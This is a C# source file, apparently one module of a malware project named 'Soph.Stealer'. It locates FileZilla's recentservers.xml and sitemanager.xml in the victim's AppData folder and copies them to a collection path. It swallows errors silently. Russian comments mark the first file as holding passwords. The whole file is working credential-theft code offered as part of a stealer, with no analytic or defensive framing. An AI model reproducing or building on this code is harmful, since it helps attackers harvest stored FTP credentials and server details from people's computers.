
using System;
using System.IO;

namespace Soph.Stealer
{
  internal class FilezillaFTP
  {
    internal class FileZilla
    {
      public static void Initialise(string path)
      {
        if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml")) //условие того что есть файл с паролями
          return;
        try
        {
          File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml", path + "filezilla_recentservers.xml", true); //копируем файл
        }
        catch
        {
        }
        if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml")) //проверяем на файл с сайтами
          return;
        try
        {
          File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml", path + "filezilla_sitemanager.xml", true); //копируем
        }
        catch
        {
        }
      }
    }
  }
}
